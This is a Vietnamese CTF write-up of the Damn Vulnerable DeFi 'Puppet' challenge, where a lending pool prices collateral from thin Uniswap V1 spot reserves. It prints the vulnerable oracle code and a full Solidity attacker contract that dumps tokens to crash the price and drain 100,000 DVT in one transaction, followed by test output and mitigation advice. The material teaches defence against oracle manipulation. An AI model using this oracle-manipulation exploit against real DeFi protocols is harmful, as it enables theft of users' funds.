---
title: "[DVD-07] Puppet: thao túng giá oracle Uniswap V1 để vay toàn bộ pool với gần 0 collateral"
description: "Mục tiêu là rút toàn bộ 100.000 DVT khỏi PuppetPool trong một giao dịch. Lỗ hổng nằm ở _computeOraclePrice() dùng trực tiếp số dư spot của pair Uniswap V1 làm giá — chỉ cần swap lượng lớn token vào pair là giá suy giảm mạnh, collateral yêu cầu giảm gần về 0."
pubDate: 2026-08-23
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "oracle-manipulation"]
draft: false
challenge: "damn-vulnerable-defi"
difficulty: "easy"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Puppet là bài mở đầu cho chuỗi oracle của Damn Vulnerable DeFi: một lending pool dùng **spot price** đọc trực tiếp từ cặp thanh khoản Uniswap V1 làm oracle. Pair chỉ có 10 DVT / 10 ETH, trong khi player nắm 1.000 DVT — đủ sức đẩy giá xuống gần 0 chỉ bằng một lần swap. Sau khi giá suy giảm mạnh, khoản collateral cần nộp để vay 100.000 DVT chỉ còn ~19,7 ETH, thấp hơn số dư 25 ETH của player. Toàn bộ kịch bản gói trong **một giao dịch** bằng một contract tấn công triển khai ngay trong constructor.

## Bối cảnh & Mục tiêu

Hai contract chính:

- **PuppetPool** (`src/puppet/PuppetPool.sol`) — lending pool: ai cũng có thể `borrow(amount, recipient)` nếu nộp collateral gấp `DEPOSIT_FACTOR = 2` lần giá trị token muốn vay, tính theo ETH.
- **Uniswap V1 exchange** — cặp DVT/ETH được tạo từ factory, đóng vai trò oracle cho pool.

Trạng thái ban đầu (`test/puppet/Puppet.t.sol`):

- Pair có 10 DVT / 10 ETH → giá 1 DVT = 1 ETH, nên `calculateDepositRequired(1e18) == 2e18`.
- Lending pool nắm 100.000 DVT.
- Player có 1.000 DVT + 25 ETH.

Điều kiện thắng trong `_isSolved()` (dòng 146–153): player chỉ được thực hiện **đúng một giao dịch** (`vm.getNonce(player) == 1`), pool phải hết token và recovery nhận đủ ≥ 100.000 DVT.

## Phân tích lỗ hổng

Giá token được tính tại `src/puppet/PuppetPool.sol:55-62`:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

`_computeOraclePrice()` lấy **tỷ lệ balance tức thời** của pair: ETH balance chia cho token balance. Đây là spot price thuần túy:

- Không có TWAP, không có kiểm tra độ sâu thanh khoản, không có cơ chế chống thao túng nào.
- Bất kỳ ai cũng có thể swap trên pair đó, và swap làm thay đổi ngay balance → thay đổi ngay giá mà pool định giá.
- Pair chỉ có 10 DVT / 10 ETH — vốn thanh khoản cực mỏng so với 1.000 DVT player đang cầm.

Thêm nữa, `borrow()` (dòng 30–53) chấp nhận `msg.value` lớn hơn collateral và hoàn lại phần thừa, nên attacker không cần tính toán chính xác con số nộp vào.

## Khai thác

Kịch bản gồm 3 bước, tất cả nằm trong constructor của `PuppetAttacker` (test/puppet/Puppet.t.sol:15-41):

```solidity
contract PuppetAttacker {
    constructor(
        DamnValuableToken token,
        IUniswapV1Exchange exchange,
        PuppetPool pool,
        address recovery,
        uint256 tokensToSell,
        uint256 borrowAmount
    ) payable {
        token.transferFrom(msg.sender, address(this), tokensToSell); // kéo 1.000 DVT
        token.approve(address(exchange), tokensToSell);
        exchange.tokenToEthSwapInput(tokensToSell, 1, block.timestamp); // dump toàn bộ vào pair

        uint256 deposit = pool.calculateDepositRequired(borrowAmount);
        pool.borrow{value: deposit}(borrowAmount, recovery); // vay 100.000 DVT, chuyển thẳng recovery

        payable(msg.sender).transfer(address(this).balance); // trả ETH thừa
    }
}
```

1. **Bán (swap) 1.000 DVT vào pair** qua `tokenToEthSwapInput`. Theo công thức Uniswap V1 (fee 0,3%), token reserve tăng từ 10 lên ~1007, ETH reserve co từ 10 về ~0,099 ETH (bảo toàn tích số). Giá mới ≈ 9,86e-5 ETH/DVT — giảm ~4 bậc độ lớn.
2. **Tính lại collateral**: vay 100.000 DVT cần `100.000 × 9,86e-5 × 2 ≈ 19,7 ETH`. Player gửi 25 ETH, pool hoàn lại phần thừa.
3. **Pool chuyển 100.000 DVT thẳng tới recovery.**

Ràng buộc "một giao dịch" được xử lý khéo: player `approve()` cho địa chỉ *dự đoán trước* của contract (`vm.computeCreateAddress`) — approve là CALL nên không làm tăng nonce dùng cho CREATE — sau đó đúng một lệnh `new PuppetAttacker{value: ...}()` (một CREATE) hoàn tất mọi thứ.

## Kết quả

Chạy `forge test --match-path test/puppet/Puppet.t.sol`:

```
Ran 2 tests for test/puppet/Puppet.t.sol:PuppetChallenge
[PASS] test_assertInitialState() (gas: 49224)
[PASS] test_puppet() (gas: 195598)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Không bao giờ dùng spot reserve của một AMM mỏng làm oracle cho vay.** Giá phải đến từ nguồn chống thao túng: Chainlink feed, TWAP dài hạn (Uniswap V2/V3 Oracle library), hoặc nhiều nguồn tổng hợp có cơ chế loại trừ giá bất thường.
- **Nếu dùng AMM làm oracle, phải kiểm tra độ sâu thanh khoản** (reserve tối thiểu, phần trăm pool mà một giao dịch có thể chi phối) và dùng giá trung bình theo thời gian thay vì giá tức thời.
- **Tách biệt quyền swap và quyền định giá:** một thực thể có thể thao túng giá chỉ vì nó có token để swap — pool định giá theo dữ liệu mà kẻ vay có thể tự đổi được là thiết kế sai từ gốc.

## Tham khảo

- Challenge: [Puppet — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/challenges/puppet)
- Source: `src/puppet/PuppetPool.sol`, `src/puppet/IUniswapV1Exchange.sol`, `test/puppet/Puppet.t.sol`
